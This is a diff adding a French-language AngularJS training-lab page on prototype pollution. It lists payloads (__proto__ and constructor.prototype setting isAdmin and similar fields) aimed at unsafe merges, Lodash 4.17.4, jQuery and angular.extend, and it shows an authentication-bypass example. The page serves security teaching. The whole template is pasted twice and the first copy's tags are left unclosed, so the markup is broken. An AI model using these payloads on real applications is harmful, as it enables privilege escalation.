@@ -1,0 +1,297 @@
+<div class="panel panel-danger">
+    <div class="panel-heading">
+        <h2>Prototype Pollution (AngularJS)</h2>
+    </div>
+    <div class="panel-body">
+        
+        <!-- Section 1: Deep Merge -->
+        <div class="well">
+            <h3>1. Deep Merge Sans Protection</h3>
+            <textarea ng-model="mergeData" class="form-control" rows="5" 
+                      placeholder='{"__proto__": {"isAdmin": true}}'></textarea>
+            <button ng-click="unsafeMerge()" class="btn btn-danger">Deep Merge</button>
+            <button ng-click="testPollution()" class="btn btn-info">Tester Pollution</button>
+            <pre>Exemple: {{getExamplePayload()}}</pre>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ol>
+                    <li>Copiez ce payload : <code>{"__proto__": {"isAdmin": true, "role": "superuser"}}</code></li>
+                    <li>Cliquez "Deep Merge"</li>
+                    <li>Ouvrez la console et tapez : <code>console.log({}.isAdmin)</code></li>
+                    <li>Si ça retourne <code>true</code>, Object.prototype est pollué ! 🎯</li>
+                </ol>
+                <strong>Impact :</strong> TOUS les nouveaux objets auront isAdmin = true
+            </div>
+        </div>
+
+        <!-- Section 2: Object.assign -->
+        <div class="well">
+            <h3>2. Object.assign avec Données Utilisateur</h3>
+            <textarea ng-model="assignData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"role": "admin"}}'></textarea>
+            <button ng-click="unsafeAssign()" class="btn btn-danger">Object.assign</button>
+            <p class="text-muted">Object.assign copie les propriétés énumérables</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>{"__proto__": {"vulnerable": true}}</code></li>
+                    <li><code>{"constructor": {"prototype": {"isVulnerable": true}}}</code></li>
+                </ul>
+                <strong>Vérifiez :</strong> <code>console.log(({}).vulnerable)</code>
+            </div>
+        </div>
+
+        <!-- Section 3: Lodash Merge -->
+        <div class="well">
+            <h3>3. Lodash Merge (Version Vulnérable: 4.17.4)</h3>
+            <textarea ng-model="mergeData" class="form-control" rows="4" 
+                      placeholder='{"constructor": {"prototype": {"isAdmin": true}}}'></textarea>
+            <button ng-click="lodashMerge()" class="btn btn-danger">_.merge()</button>
+            <p class="text-danger">Lodash < 4.17.21 est vulnérable!</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester (CVE-2019-10744) :</strong>
+                <ul>
+                    <li><code>{"constructor": {"prototype": {"polluted": "yes"}}}</code></li>
+                    <li><code>{"__proto__": {"defaultsLoaded": true}}</code></li>
+                </ul>
+                <strong>Cette version de Lodash (4.17.4) a une vraie vulnérabilité !</strong>
+            </div>
+        </div>
+
+        <!-- Section 4: jQuery Extend -->
+        <div class="well">
+            <h3>4. jQuery Extend Deep</h3>
+            <textarea ng-model="extendData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"vulnerable": true}}'></textarea>
+            <button ng-click="jqueryExtend()" class="btn btn-danger">$.extend(true, ...)</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <p>jQuery 2.2.4 est vulnérable à la pollution !</p>
+                <ul>
+                    <li><code>{"__proto__": {"jqueryPolluted": true}}</code></li>
+                    <li><code>{"constructor": {"prototype": {"extended": true}}}</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 5: Angular Extend -->
+        <div class="well">
+            <h3>5. Angular.extend</h3>
+            <textarea ng-model="extendData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"polluted": true}}'></textarea>
+            <button ng-click="angularExtend()" class="btn btn-danger">angular.extend()</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>{"__proto__": {"angularPolluted": true}}</code></li>
+                    <li><code>{"constructor": {"prototype": {"ngVulnerable": true}}}</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 6: Recursive Copy -->
+        <div class="well">
+            <h3>6. Copie Récursive Sans Protection</h3>
+            <textarea ng-model="objectData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"copied": true}}'></textarea>
+            <button ng-click="recursiveCopy()" class="btn btn-danger">Copier Récursivement</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li><code>{"__proto__": {"recursivePollution": true}}</code></li>
+                    <li><code>{"a": {"__proto__": {"nested": true}}}</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 7: Test de Pollution -->
+        <div class="well">
+            <h3>7. Vérifier la Pollution du Prototype</h3>
+            <button ng-click="testPollution()" class="btn btn-warning">
+                Vérifier Object.prototype
+            </button>
+            <p>Ouvrez la console pour voir les résultats</p>
+            <div class="alert alert-info">
+                <strong>Test:</strong> Si la pollution a réussi, tous les nouveaux objets {} 
+                auront les propriétés polluées (isAdmin, role, etc.)
+                
+                <strong>💡 Tests dans la console :</strong>
+                <pre>
+// Test 1: Créer un objet vide
+console.log({}.isAdmin);        // true si pollué
+console.log({}.role);           // "admin" si pollué
+
+// Test 2: Tous les objets sont affectés
+var obj = {};
+console.log(obj.isAdmin);       // true si pollué
+
+// Test 3: Même les objets existants
+console.log(window.isAdmin);    // undefined (pas affecté)
+var newObj = Object.create({});
+console.log(newObj.isAdmin);    // true si pollué</pre>
+            </div>
+        </div>
+
+        <!-- Section 8: Exemples de Payloads -->
+        <div class="well">
+            <h3>8. Payloads d'Exemple</h3>
+            <h4>Payload __proto__:</h4>
+            <pre>{{getExamplePayload()}}</pre>
+            
+            <h4>Payload constructor:</h4>
+            <pre>{{getConstructorPayload()}}</pre>
+            
+            <div class="alert alert-warning">
+                <strong>🎯 Payloads avancés :</strong>
+                <pre>
+// Pollution multiple niveaux
+{
+  "__proto__": {
+    "__proto__": {
+      "deepPollution": true
+    }
+  }
+}
+
+// Bypass avec tableau
+[{"__proto__": {"arrayPollution": true}}]
+
+// Pollution via constructor
+{
+  "constructor": {
+    "prototype": {
+      "isAdmin": true,
+      "permissions": ["read", "write", "delete"]
+    }
+  }
+}</pre>
+            </div>
+            
+            <p class="text-danger">
+                Ces payloads peuvent polluer Object.prototype et affecter 
+                tous les objets de l'application!
+            </p>
+        </div>
+
+        <!-- Indicateur visuel de pollution -->
+        <div class="alert alert-danger">
+            <h4>🚨 Impact de la Pollution :</h4>
+            <ul>
+                <li><strong>Bypass d'authentification :</strong> Si le code vérifie <code>user.isAdmin</code></li>
+                <li><strong>Modification de configuration :</strong> Ajout de propriétés à tous les objets</li>
+                <li><strong>XSS :</strong> Si des propriétés polluées sont utilisées dans le DOM</li>
+                <li><strong>DoS :</strong> Pollution avec des propriétés qui cassent l'application</li>
+            </ul>
+            
+            <strong>Exemple d'exploitation :</strong>
+            <pre>
+// Code vulnérable
+if (user.isAdmin) {
+  // Accès admin
+}
+
+// Après pollution avec {"__proto__": {"isAdmin": true}}
+// TOUS les objets ont isAdmin = true !
+var user = {}; // Objet vide
+console.log(user.isAdmin); // true ! 💥</pre>
+        </div><div class="panel panel-danger">
+    <div class="panel-heading">
+        <h2>Prototype Pollution (AngularJS)</h2>
+    </div>
+    <div class="panel-body">
+        
+        <!-- Section 1: Deep Merge -->
+        <div class="well">
+            <h3>1. Deep Merge Sans Protection</h3>
+            <textarea ng-model="mergeData" class="form-control" rows="5" 
+                      placeholder='{"__proto__": {"isAdmin": true}}'></textarea>
+            <button ng-click="unsafeMerge()" class="btn btn-danger">Deep Merge</button>
+            <button ng-click="testPollution()" class="btn btn-info">Tester Pollution</button>
+            <pre>Exemple: {{getExamplePayload()}}</pre>
+        </div>
+
+        <!-- Section 2: Object.assign -->
+        <div class="well">
+            <h3>2. Object.assign avec Données Utilisateur</h3>
+            <textarea ng-model="assignData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"role": "admin"}}'></textarea>
+            <button ng-click="unsafeAssign()" class="btn btn-danger">Object.assign</button>
+            <p class="text-muted">Object.assign copie les propriétés énumérables</p>
+        </div>
+
+        <!-- Section 3: Lodash Merge -->
+        <div class="well">
+            <h3>3. Lodash Merge (Version Vulnérable: 4.17.4)</h3>
+            <textarea ng-model="mergeData" class="form-control" rows="4" 
+                      placeholder='{"constructor": {"prototype": {"isAdmin": true}}}'></textarea>
+            <button ng-click="lodashMerge()" class="btn btn-danger">_.merge()</button>
+            <p class="text-danger">Lodash < 4.17.21 est vulnérable!</p>
+        </div>
+
+        <!-- Section 4: jQuery Extend -->
+        <div class="well">
+            <h3>4. jQuery Extend Deep</h3>
+            <textarea ng-model="extendData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"vulnerable": true}}'></textarea>
+            <button ng-click="jqueryExtend()" class="btn btn-danger">$.extend(true, ...)</button>
+        </div>
+
+        <!-- Section 5: Angular Extend -->
+        <div class="well">
+            <h3>5. Angular.extend</h3>
+            <textarea ng-model="extendData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"polluted": true}}'></textarea>
+            <button ng-click="angularExtend()" class="btn btn-danger">angular.extend()</button>
+        </div>
+
+        <!-- Section 6: Recursive Copy -->
+        <div class="well">
+            <h3>6. Copie Récursive Sans Protection</h3>
+            <textarea ng-model="objectData" class="form-control" rows="4" 
+                      placeholder='{"__proto__": {"copied": true}}'></textarea>
+            <button ng-click="recursiveCopy()" class="btn btn-danger">Copier Récursivement</button>
+        </div>
+
+        <!-- Section 7: Test de Pollution -->
+        <div class="well">
+            <h3>7. Vérifier la Pollution du Prototype</h3>
+            <button ng-click="testPollution()" class="btn btn-warning">
+                Vérifier Object.prototype
+            </button>
+            <p>Ouvrez la console pour voir les résultats</p>
+            <div class="alert alert-info">
+                <strong>Test:</strong> Si la pollution a réussi, tous les nouveaux objets {} 
+                auront les propriétés polluées (isAdmin, role, etc.)
+            </div>
+        </div>
+
+        <!-- Section 8: Exemples de Payloads -->
+        <div class="well">
+            <h3>8. Payloads d'Exemple</h3>
+            <h4>Payload __proto__:</h4>
+            <pre>{{getExamplePayload()}}</pre>
+            
+            <h4>Payload constructor:</h4>
+            <pre>{{getConstructorPayload()}}</pre>
+            
+            <p class="text-danger">
+                Ces payloads peuvent polluer Object.prototype et affecter 
+                tous les objets de l'application!
+            </p>
+        </div>
+
+        <!-- Indicateur visuel de pollution -->
+        <div class="alert alert-warning">
+            <strong>Impact:</strong> La pollution du prototype peut permettre 
+            d'ajouter des propriétés à TOUS les objets JavaScript, 
+            potentiellement en contournant les contrôles de sécurité.
+        </div>
+
+    </div>
+</div>
